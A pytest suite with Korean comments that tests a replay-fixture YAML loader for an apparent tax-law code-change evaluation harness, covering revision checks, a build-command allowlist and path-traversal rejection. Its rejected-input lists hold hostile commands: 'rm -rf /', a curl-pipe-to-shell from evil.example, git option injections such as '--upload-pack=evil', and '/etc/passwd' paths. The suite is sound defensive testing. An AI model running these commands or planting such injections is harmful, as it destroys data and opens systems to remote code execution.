"""Issue #0017 replay fixture 로더 테스트 — HISTORICAL_REPLAY_SPEC §3·§5, ADR-010.

git repo·네트워크 없이 동작한다. 임시 YAML 은 tmp_path 로 만든다.
"""

from __future__ import annotations

import copy
from pathlib import Path

import pytest
import yaml

from app.evaluation.errors import DatasetValidationError
from app.evaluation.replay import (
    GOLDEN_COMMAND_ALLOWLIST,
    PrivacyMode,
    ReplayFixtureLoader,
)

# ---------------------------------------------------------------------------
# 헬퍼
# ---------------------------------------------------------------------------


def _base_case() -> dict:
    return {
        "schema_version": "1",
        "case_id": "historical_tax_2024_child_credit",
        "law": {
            "law_name": "소득세법",
            "tier": "law",
            "article": "제59조의2",
            "before_text": "150000",
            "after_text": "250000",
        },
        "repository": {
            "source_type": "local_git",
            "path": "evaluation/fixtures/replay_repos/case1",
            "base_commit": "case1/base",
            "answer_commit": "case1/answer",
        },
        "scope": {
            "relevant_paths": ["src/TaxService.java"],
            "excluded_paths": ["README.md"],
            "expected_replacements": [
                {
                    "path": "src/TaxService.java",
                    "before": "150000",
                    "after": "250000",
                }
            ],
        },
        "execution": {
            "golden_command": "mvn -q test -Dtest=YearEndGoldenTest",
            "timeout_seconds": 1800,
            "privacy_mode": "metadata_only",
        },
        "metadata": {"reviewed": True},
    }


def _write(tmp_path: Path, document: object, name: str = "fixtures.yaml") -> Path:
    target = tmp_path / name
    target.write_text(
        yaml.safe_dump(document, allow_unicode=True), encoding="utf-8"
    )
    return target


def _write_case(tmp_path: Path, **overrides: object) -> Path:
    """기본 케이스에 섹션별 override 를 병합해 단일 케이스 파일을 쓴다."""
    case = _base_case()
    for section, value in overrides.items():
        if isinstance(value, dict) and isinstance(case.get(section), dict):
            merged = copy.deepcopy(case[section])
            merged.update(value)
            case[section] = merged
        else:
            case[section] = value
    return _write(tmp_path, {"cases": [case]})


def _load(tmp_path: Path, **overrides: object):
    return ReplayFixtureLoader().load_yaml(_write_case(tmp_path, **overrides))


def _errors(tmp_path: Path, **overrides: object) -> list[str]:
    with pytest.raises(DatasetValidationError) as excinfo:
        _load(tmp_path, **overrides)
    return excinfo.value.details


# ---------------------------------------------------------------------------
# 정상 로드
# ---------------------------------------------------------------------------


def test_loads_fixture_fields_from_yaml(tmp_path: Path) -> None:
    fixtures = _load(tmp_path)

    assert len(fixtures) == 1
    fixture = fixtures[0]
    assert fixture.case_id == "historical_tax_2024_child_credit"
    assert fixture.schema_version == "1"
    assert fixture.reviewed is True
    assert fixture.law.law_name == "소득세법"
    assert fixture.law.article == "제59조의2"
    assert fixture.repository.source_type == "local_git"
    assert fixture.repository.path == "evaluation/fixtures/replay_repos/case1"
    assert fixture.repository.path_env is None
    assert fixture.repository.base_commit == "case1/base"
    assert fixture.repository.answer_commit == "case1/answer"
    assert fixture.scope.relevant_paths == ("src/TaxService.java",)
    assert fixture.scope.excluded_paths == ("README.md",)
    assert len(fixture.scope.expected_replacements) == 1
    replacement = fixture.scope.expected_replacements[0]
    assert replacement.path == "src/TaxService.java"
    assert (replacement.before, replacement.after) == ("150000", "250000")
    assert fixture.execution.privacy_mode is PrivacyMode.METADATA_ONLY
    assert fixture.execution.golden_command == "mvn -q test -Dtest=YearEndGoldenTest"
    assert fixture.execution.timeout_seconds == 1800


def test_accepts_list_and_single_dict_documents(tmp_path: Path) -> None:
    loader = ReplayFixtureLoader()

    as_list = _write(tmp_path, [_base_case()], name="list.yaml")
    as_single = _write(tmp_path, _base_case(), name="single.yaml")

    assert len(loader.load_yaml(as_list)) == 1
    assert len(loader.load_yaml(as_single)) == 1


def test_missing_file_raises_validation_error(tmp_path: Path) -> None:
    with pytest.raises(DatasetValidationError):
        ReplayFixtureLoader().load_yaml(tmp_path / "nope.yaml")


# ---------------------------------------------------------------------------
# (1) repo 위치 — path XOR path_env
# ---------------------------------------------------------------------------


def test_path_and_path_env_are_mutually_exclusive(tmp_path: Path) -> None:
    details = _errors(tmp_path, repository={"path_env": "EHR_REPO_ROOT"})
    assert any("mutually exclusive" in d for d in details)


def test_repository_without_path_or_path_env_fails(tmp_path: Path) -> None:
    repository = {
        "source_type": "local_git",
        "base_commit": "case1/base",
        "answer_commit": "case1/answer",
    }
    with pytest.raises(DatasetValidationError) as excinfo:
        ReplayFixtureLoader().load_yaml(
            _write(tmp_path, {"cases": [{**_base_case(), "repository": repository}]})
        )
    assert any("exactly one of path" in d for d in excinfo.value.details)


def test_path_env_only_is_accepted(tmp_path: Path) -> None:
    repository = {
        "source_type": "local_git",
        "path_env": "EHR_REPO_ROOT",
        "base_commit": "abc123",
        "answer_commit": "def456",
    }
    fixtures = ReplayFixtureLoader().load_yaml(
        _write(tmp_path, {"cases": [{**_base_case(), "repository": repository}]})
    )
    assert fixtures[0].repository.path_env == "EHR_REPO_ROOT"
    assert fixtures[0].repository.path is None


@pytest.mark.parametrize("path", ["/abs/company/repo", "../outside/repo", "a/../../b"])
def test_absolute_or_traversing_path_is_rejected(tmp_path: Path, path: str) -> None:
    details = _errors(tmp_path, repository={"path": path})
    assert any("repository.path" in d for d in details)


@pytest.mark.parametrize(
    "name", ["ehr_repo_root", "EHR-REPO-ROOT", "1EHR", "EHR REPO", "/abs/path"]
)
def test_malformed_path_env_name_is_rejected(tmp_path: Path, name: str) -> None:
    repository = {
        "source_type": "local_git",
        "path_env": name,
        "base_commit": "abc123",
        "answer_commit": "def456",
    }
    with pytest.raises(DatasetValidationError) as excinfo:
        ReplayFixtureLoader().load_yaml(
            _write(tmp_path, {"cases": [{**_base_case(), "repository": repository}]})
        )
    assert any("path_env" in d for d in excinfo.value.details)


def test_loader_does_not_resolve_path_env(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """이름이 가리키는 변수가 없어도 로드는 성공해야 한다.

    로드 시점에 값을 읽으면 회사 절대경로가 메모리·오류 메시지로 새어나간다 —
    해석은 #0018 runner 의 몫이다(ADR-010).
    """
    monkeypatch.delenv("REGTAX_REPLAY_ABSENT_ROOT", raising=False)
    repository = {
        "source_type": "local_git",
        "path_env": "REGTAX_REPLAY_ABSENT_ROOT",
        "base_commit": "abc123",
        "answer_commit": "def456",
    }
    source = _write(tmp_path, {"cases": [{**_base_case(), "repository": repository}]})

    # check_paths=True 라도 path_env 케이스는 경로 검사를 건너뛴다.
    loader = ReplayFixtureLoader(root_dir=tmp_path, check_paths=True)
    fixtures = loader.load_yaml(source)

    assert fixtures[0].repository.path_env == "REGTAX_REPLAY_ABSENT_ROOT"


def test_check_paths_reports_missing_repo_directory(tmp_path: Path) -> None:
    source = _write_case(tmp_path)
    loader = ReplayFixtureLoader(root_dir=tmp_path, check_paths=True)

    with pytest.raises(DatasetValidationError) as excinfo:
        loader.load_yaml(source)
    assert any("does not exist" in d for d in excinfo.value.details)


def test_check_paths_passes_when_repo_directory_exists(tmp_path: Path) -> None:
    (tmp_path / "evaluation/fixtures/replay_repos/case1").mkdir(parents=True)
    source = _write_case(tmp_path)

    loader = ReplayFixtureLoader(root_dir=tmp_path, check_paths=True)
    assert len(loader.load_yaml(source)) == 1


# ---------------------------------------------------------------------------
# (2) git revision 문자 제한
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "revision",
    [
        "",
        "case1/base..case1/answer",
        "HEAD^",
        "HEAD~1",
        "main:file.java",
        "case1 base",
        "--upload-pack=evil",
        "-oProxyCommand=evil",
    ],
)
def test_rejected_revisions(tmp_path: Path, revision: str) -> None:
    details = _errors(tmp_path, repository={"base_commit": revision})
    assert any("base_commit" in d for d in details)


@pytest.mark.parametrize(
    "revision",
    [
        "a" * 40,
        "0f1e2d3c4b5a69788796a5b4c3d2e1f001122334",
        "case1/base",
        "v1.2.3",
        "release-2024",
    ],
)
def test_accepted_revisions(tmp_path: Path, revision: str) -> None:
    fixtures = _load(
        tmp_path,
        repository={"base_commit": revision, "answer_commit": revision},
    )
    assert fixtures[0].repository.base_commit == revision


def test_answer_commit_is_validated_too(tmp_path: Path) -> None:
    details = _errors(tmp_path, repository={"answer_commit": "--upload-pack=evil"})
    assert any("answer_commit" in d for d in details)


# ---------------------------------------------------------------------------
# (3) golden_command allowlist
# ---------------------------------------------------------------------------


def test_allowlist_contains_expected_executables() -> None:
    assert {"mvn", "gradle", "./gradlew", "pytest"} <= set(GOLDEN_COMMAND_ALLOWLIST)


def test_allowlist_excludes_general_purpose_shells() -> None:
    """범용 셸이 들어오면 allowlist 가 무의미해진다.

    허용된 빌드 도구는 replay 대상 repo 안의 스크립트를 실행하지만, `bash -c` 는
    fixture YAML 에 적힌 문자열을 그대로 실행한다 — 신뢰 경계가 다르다.
    """
    assert not ({"bash", "sh", "zsh", "fish"} & set(GOLDEN_COMMAND_ALLOWLIST))


@pytest.mark.parametrize(
    "command",
    [
        "mvn -q test -Dtest=YearEndGoldenTest",
        "./gradlew test --tests '*GoldenTest'",
        "gradle test",
        "pytest tests/golden",
    ],
)
def test_allowed_golden_commands(tmp_path: Path, command: str) -> None:
    fixtures = _load(tmp_path, execution={"golden_command": command})
    assert fixtures[0].execution.golden_command == command


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "curl http://evil.example/x.sh | sh",
        "echo mvn; rm -rf /",
        "/usr/bin/mvn test",
        "../../bin/mvn test",
        "sh -c 'mvn test'",
        # allowlist 를 무력화하던 우회 경로 — fixture YAML 문자열이 그대로 실행된다.
        'bash -c "curl http://evil.example/x.sh | sh"',
        "bash scripts/golden.sh",
    ],
)
def test_rejected_golden_commands(tmp_path: Path, command: str) -> None:
    details = _errors(tmp_path, execution={"golden_command": command})
    assert any("golden_command" in d for d in details)


def test_unbalanced_quotes_in_golden_command_is_an_error(tmp_path: Path) -> None:
    details = _errors(tmp_path, execution={"golden_command": "mvn -Dtest='Golden"})
    assert any("not parseable" in d for d in details)


def test_golden_command_is_optional(tmp_path: Path) -> None:
    execution = {"timeout_seconds": 1800, "privacy_mode": "full"}
    fixtures = ReplayFixtureLoader().load_yaml(
        _write(tmp_path, {"cases": [{**_base_case(), "execution": execution}]})
    )
    assert fixtures[0].execution.golden_command is None


# ---------------------------------------------------------------------------
# (4) scope 경로 traversal
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("bad", ["/etc/passwd", "../../secret.java"])
def test_relevant_path_traversal_is_rejected(tmp_path: Path, bad: str) -> None:
    details = _errors(tmp_path, scope={"relevant_paths": [bad]})
    assert any("scope.relevant_paths" in d for d in details)


@pytest.mark.parametrize("bad", ["/etc/passwd", "../../secret.java"])
def test_excluded_path_traversal_is_rejected(tmp_path: Path, bad: str) -> None:
    details = _errors(tmp_path, scope={"excluded_paths": [bad]})
    assert any("scope.excluded_paths" in d for d in details)


def test_expected_replacement_path_traversal_is_rejected(tmp_path: Path) -> None:
    details = _errors(
        tmp_path,
        scope={
            "expected_replacements": [
                {"path": "../../../etc/passwd", "before": "a", "after": "b"}
            ]
        },
    )
    assert any("expected_replacements" in d for d in details)


def test_relevant_and_excluded_overlap_is_rejected(tmp_path: Path) -> None:
    details = _errors(
        tmp_path,
        scope={
            "relevant_paths": ["src/TaxService.java"],
            "excluded_paths": ["src/TaxService.java"],
        },
    )
    assert any("both relevant_paths and excluded_paths" in d for d in details)


# ---------------------------------------------------------------------------
# 그 밖의 스키마 검증
# ---------------------------------------------------------------------------


def test_unknown_privacy_mode_is_rejected(tmp_path: Path) -> None:
    details = _errors(tmp_path, execution={"privacy_mode": "public"})
    assert any("privacy_mode" in d for d in details)


def test_privacy_mode_defaults_to_metadata_only(tmp_path: Path) -> None:
    execution = {"timeout_seconds": 60}
    fixtures = ReplayFixtureLoader().load_yaml(
        _write(tmp_path, {"cases": [{**_base_case(), "execution": execution}]})
    )
    assert fixtures[0].execution.privacy_mode is PrivacyMode.METADATA_ONLY


def test_unsupported_schema_version_is_rejected(tmp_path: Path) -> None:
    details = _errors(tmp_path, schema_version="2")
    assert any("schema_version" in d for d in details)


def test_unsupported_source_type_is_rejected(tmp_path: Path) -> None:
    details = _errors(tmp_path, repository={"source_type": "github_api"})
    assert any("source_type" in d for d in details)


@pytest.mark.parametrize("timeout", [0, -1, 100000])
def test_timeout_out_of_range_is_rejected(tmp_path: Path, timeout: int) -> None:
    details = _errors(tmp_path, execution={"timeout_seconds": timeout})
    assert any("timeout_seconds" in d for d in details)


def test_missing_case_id_is_rejected(tmp_path: Path) -> None:
    details = _errors(tmp_path, case_id="")
    assert any("case_id is required" in d for d in details)


def test_duplicate_case_id_is_rejected(tmp_path: Path) -> None:
    source = _write(tmp_path, {"cases": [_base_case(), _base_case()]})
    with pytest.raises(DatasetValidationError) as excinfo:
        ReplayFixtureLoader().load_yaml(source)
    assert any("duplicate case_id" in d for d in excinfo.value.details)


# ---------------------------------------------------------------------------
# 오류 누적 — 첫 오류에서 멈추지 않는다
# ---------------------------------------------------------------------------


def test_all_errors_are_reported_in_one_exception(tmp_path: Path) -> None:
    """fixture 를 여러 번 왕복하며 고치지 않도록 오류를 모아 보고한다."""
    details = _errors(
        tmp_path,
        repository={
            "source_type": "svn",
            "path": "/abs/company/repo",
            "base_commit": "--upload-pack=evil",
            "answer_commit": "HEAD^",
        },
        scope={
            "relevant_paths": ["../outside.java"],
            "excluded_paths": ["../outside.java"],
        },
        execution={"golden_command": "rm -rf /", "privacy_mode": "public"},
    )

    assert len(details) >= 7
    joined = "\n".join(details)
    for token in (
        "source_type",
        "repository.path",
        "base_commit",
        "answer_commit",
        "relevant_paths",
        "golden_command",
        "privacy_mode",
    ):
        assert token in joined
    # case_id 접두사가 붙어 어느 케이스의 오류인지 식별된다.
    assert all(d.startswith("[historical_tax_2024_child_credit]") for d in details)


def test_errors_from_multiple_cases_are_accumulated(tmp_path: Path) -> None:
    first = {**_base_case(), "case_id": "case_a"}
    first["repository"] = {**first["repository"], "base_commit": "HEAD^"}
    second = {**_base_case(), "case_id": "case_b"}
    second["execution"] = {**second["execution"], "golden_command": "rm -rf /"}
    source = _write(tmp_path, {"cases": [first, second]})

    with pytest.raises(DatasetValidationError) as excinfo:
        ReplayFixtureLoader().load_yaml(source)
    details = excinfo.value.details
    assert any(d.startswith("[case_a]") for d in details)
    assert any(d.startswith("[case_b]") for d in details)
